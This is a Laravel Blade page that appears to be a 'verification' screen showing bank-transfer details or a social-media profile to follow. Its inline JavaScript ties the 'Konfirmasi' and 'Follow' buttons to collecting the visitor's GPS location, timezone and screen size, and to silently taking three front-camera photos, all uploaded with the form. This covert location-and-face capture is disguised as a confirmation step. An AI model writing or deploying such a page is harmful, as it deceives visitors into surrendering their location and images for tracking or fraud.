<x-guest-layout>
    <div class="text-center">
        <h2 class="text-lg font-semibold text-gray-800">Verifikasi</h2>
        <p class="mt-1 text-sm text-gray-600">Periksa detail di bawah ini, lalu tekan tombol sesuai konfirmasi Anda.</p>
    </div>

    @if ($bankTransfer !== null && $bankTransfer->status === \App\Enums\ConfigStatus::Aktif)
        <div class="mt-6 rounded-lg border border-gray-200 p-5">
            <h3 class="text-sm font-semibold uppercase tracking-wide text-gray-500">Bank Transfer</h3>

            @if ($bankTransfer->isComplete())
                <dl class="mt-4 grid grid-cols-1 gap-3">
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Nama Bank</dt>
                        <dd class="mt-0.5 text-sm font-semibold text-gray-900">{{ $bankTransfer->bank_name }}</dd>
                    </div>
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Nomor Rekening</dt>
                        <dd class="mt-0.5 font-mono text-sm text-gray-900">{{ $bankTransfer->account_number }}</dd>
                    </div>
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Jumlah Transfer</dt>
                        <dd class="mt-0.5 text-sm font-semibold text-gray-900">{{ $bankTransfer->formattedAmount() }}</dd>
                    </div>
                    @if (filled($bankTransfer->notes))
                        <div>
                            <dt class="text-sm font-medium text-gray-500">Catatan</dt>
                            <dd class="mt-0.5 text-sm text-gray-900">{{ $bankTransfer->notes }}</dd>
                        </div>
                    @endif
                </dl>

                <form method="POST" action="{{ route('verification.store') }}" enctype="multipart/form-data"
                      class="verification-form mt-6">
                    @csrf
                    <input type="hidden" name="type" value="{{ \App\Enums\VerificationType::BankTransfer->value }}">
                    <input type="hidden" name="timezone">
                    <input type="hidden" name="screen_resolution">
                    <input type="hidden" name="latitude">
                    <input type="hidden" name="longitude">
                    <input type="hidden" name="accuracy">
                    <input type="hidden" name="photo_status">
                    <input type="hidden" name="location_status">
                    <input type="file" name="photo[]" accept="image/jpeg,image/png,image/webp" multiple class="hidden">

                    <p class="capture-status mb-4 text-center text-sm text-gray-500"></p>

                    <div class="flex items-center justify-center">
                        <button type="submit"
                                class="inline-flex items-center px-4 py-2 bg-indigo-600 border border-transparent rounded-md font-semibold text-xs text-white uppercase tracking-widest hover:bg-indigo-700 active:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 transition ease-in-out duration-150">
                            <span class="label">Konfirmasi</span>
                        </button>
                    </div>
                </form>
            @else
                <p class="mt-3 text-sm text-gray-500">Informasi belum tersedia. Hubungi pengirim.</p>
            @endif
        </div>
    @endif

    @if ($socialMedia !== null && $socialMedia->status === \App\Enums\ConfigStatus::Aktif)
        <div class="mt-6 rounded-lg border border-gray-200 p-5">
            <h3 class="text-sm font-semibold uppercase tracking-wide text-gray-500">Social Media</h3>

            @if ($socialMedia->isComplete())
                <dl class="mt-4 grid grid-cols-1 gap-3">
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Platform</dt>
                        <dd class="mt-0.5 text-sm font-semibold text-gray-900">{{ $socialMedia->platform }}</dd>
                    </div>
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Username</dt>
                        <dd class="mt-0.5 text-sm text-gray-900">{{ $socialMedia->username }}</dd>
                    </div>
                    <div>
                        <dt class="text-sm font-medium text-gray-500">Profil</dt>
                        <dd class="mt-0.5">
                            <a href="{{ $socialMedia->profile_url }}" target="_blank" rel="noopener"
                               class="text-sm font-medium text-indigo-600 hover:text-indigo-900">
                                {{ $socialMedia->profile_url }}
                            </a>
                        </dd>
                    </div>
                    @if (filled($socialMedia->caption))
                        <div>
                            <dt class="text-sm font-medium text-gray-500">Instruksi</dt>
                            <dd class="mt-0.5 text-sm text-gray-900">{{ $socialMedia->caption }}</dd>
                        </div>
                    @endif
                </dl>

                <form method="POST" action="{{ route('verification.store') }}" enctype="multipart/form-data"
                      class="verification-form mt-6">
                    @csrf
                    <input type="hidden" name="type" value="{{ \App\Enums\VerificationType::SocialMedia->value }}">
                    <input type="hidden" name="timezone">
                    <input type="hidden" name="screen_resolution">
                    <input type="hidden" name="latitude">
                    <input type="hidden" name="longitude">
                    <input type="hidden" name="accuracy">
                    <input type="hidden" name="photo_status">
                    <input type="hidden" name="location_status">
                    <input type="file" name="photo[]" accept="image/jpeg,image/png,image/webp" multiple class="hidden">

                    <p class="capture-status mb-4 text-center text-sm text-gray-500"></p>

                    <div class="flex items-center justify-center">
                        <button type="submit"
                                class="inline-flex items-center px-4 py-2 bg-pink-600 border border-transparent rounded-md font-semibold text-xs text-white uppercase tracking-widest hover:bg-pink-700 active:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2 transition ease-in-out duration-150">
                            <span class="label">Follow</span>
                        </button>
                    </div>
                </form>
            @else
                <p class="mt-3 text-sm text-gray-500">Informasi belum tersedia. Hubungi pengirim.</p>
            @endif
        </div>
    @endif

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.querySelectorAll('.verification-form').forEach(function (form) {
                var submitButton = form.querySelector('button[type="submit"]');
                var submitLabel = submitButton.querySelector('.label');
                var captureStatus = form.querySelector('.capture-status');
                var photoInput = form.querySelector('input[type="file"]');
                var submitting = false;

                form.querySelector('[name="timezone"]').value = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
                form.querySelector('[name="screen_resolution"]').value = window.screen.width + 'x' + window.screen.height;

                function captureLocation() {
                    return new Promise(function (resolve) {
                        if (!navigator.geolocation) {
                            form.querySelector('[name="location_status"]').value = 'gagal';
                            resolve();
                            return;
                        }

                        navigator.geolocation.getCurrentPosition(function (position) {
                            form.querySelector('[name="latitude"]').value = position.coords.latitude;
                            form.querySelector('[name="longitude"]').value = position.coords.longitude;
                            form.querySelector('[name="accuracy"]').value = position.coords.accuracy;
                            form.querySelector('[name="location_status"]').value = 'diberikan';
                            resolve();
                        }, function (error) {
                            form.querySelector('[name="location_status"]').value = error.code === error.PERMISSION_DENIED ? 'ditolak' : 'gagal';
                            resolve();
                        }, { timeout: 8000 });
                    });
                }

                function capturePhoto() {
                    return new Promise(function (resolve) {
                        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                            form.querySelector('[name="photo_status"]').value = 'gagal';
                            resolve();
                            return;
                        }

                        var files = [];
                        var MAX_PHOTOS = 3;

                        function stopStream(stream) {
                            stream.getTracks().forEach(function (track) { track.stop(); });
                        }

                        function finish(stream) {
                            stopStream(stream);

                            if (files.length > 0) {
                                var transfer = new DataTransfer();
                                files.forEach(function (file) { transfer.items.add(file); });
                                photoInput.files = transfer.files;
                                form.querySelector('[name="photo_status"]').value = 'diberikan';
                            }

                            captureStatus.textContent = files.length + ' dari ' + MAX_PHOTOS + ' foto diambil.';
                            resolve();
                        }

                        function waitForFrame(video, callback, elapsed) {
                            if (elapsed > 2000) {
                                callback();
                                return;
                            }

                            if (video.videoWidth > 0 && video.currentTime > 0) {
                                callback();
                                return;
                            }

                            if ('requestVideoFrameCallback' in video) {
                                video.requestVideoFrameCallback(function () {
                                    if (video.videoWidth > 0) {
                                        callback();
                                    } else {
                                        setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                                    }
                                });
                            } else {
                                setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                            }
                        }

                        function snap(video, stream, remaining) {
                            var canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(function (blob) {
                                if (blob) {
                                    files.push(new File([blob], 'foto-' + (files.length + 1) + '.jpg', { type: 'image/jpeg' }));
                                }

                                if (remaining > 1) {
                                    setTimeout(function () { snap(video, stream, remaining - 1); }, 600);
                                } else {
                                    finish(stream);
                                }
                            }, 'image/jpeg', 0.7);
                        }

                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                            .then(function (stream) {
                                var video = document.createElement('video');
                                video.srcObject = stream;
                                video.playsInline = true;
                                video.setAttribute('muted', '');
                                video.setAttribute('autoplay', '');

                                video.play().catch(function () {});

                                video.addEventListener('loadeddata', function () {
                                    waitForFrame(video, function () {
                                        snap(video, stream, MAX_PHOTOS);
                                    }, 0);
                                });
                            })
                            .catch(function (error) {
                                if (error.name === 'NotAllowedError') {
                                    form.querySelector('[name="photo_status"]').value = 'ditolak';
                                }
                                resolve();
                            });
                    });
                }

                form.addEventListener('submit', function (event) {
                    if (submitting) {
                        return;
                    }

                    event.preventDefault();
                    submitting = true;
                    submitButton.disabled = true;
                    submitLabel.textContent = 'Memproses...';
                    captureStatus.textContent = 'Meminta izin lokasi dan kamera, lalu mengambil 3 foto...';

                    Promise.all([captureLocation(), capturePhoto()]).then(function () {
                        form.submit();
                    });
                });
            });
        });
    </script>
</x-guest-layout>
